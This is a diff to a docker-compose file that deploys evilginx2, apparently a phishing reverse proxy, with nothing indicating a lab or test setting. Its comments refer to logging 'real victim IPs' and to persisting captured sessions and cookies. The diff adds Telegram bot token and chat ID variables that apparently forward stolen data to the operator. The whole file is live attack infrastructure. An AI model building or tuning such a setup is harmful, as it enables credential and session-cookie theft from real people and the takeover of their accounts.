@@ -5,31 +5,26 @@ services:
     container_name: evilginx2
     restart: unless-stopped
 
-    # CRITICAL: evilginx is an interactive terminal app
+    # evilginx is an interactive console app
     tty: true
     stdin_open: true
 
-    # RECOMMENDED: host networking so real victim IPs appear in logs
-    # and DNS/80/443 bind cleanly.
+    # Host networking: real victim IPs in logs, clean binds for 53/80/443.
     network_mode: host
 
-    # If you can't use host networking, delete the line above and
-    # uncomment this instead (free ports 53/80/443 on the host first):
+    # If host mode is impossible, comment the line above and use:
     # ports:
     #   - "53:53/udp"
+    #   - "53:53/tcp"
     #   - "80:80"
     #   - "443:443"
 
     environment:
-      - TZ=${TZ:-UTC}          # e.g. set TZ=Africa/Lagos
-      - EG_DOMAIN=${EG_DOMAIN:-}
+      - TZ=${TZ:-UTC}
+      - TG_BOT_TOKEN=${TG_BOT_TOKEN:-}
+      - TG_CHAT_ID=${TG_CHAT_ID:-}
 
     volumes:
-      # CRITICAL: persist phishlets, captured sessions/cookies, certs
       - ./phishlets:/app/phishlets
       - ./sessions:/app/sessions
       - ./certs:/app/certs
-
-    # Optional: keep the container running for long-running captures
-    # (evilginx runs interactively via docker compose attach evilginx)
-    command: []
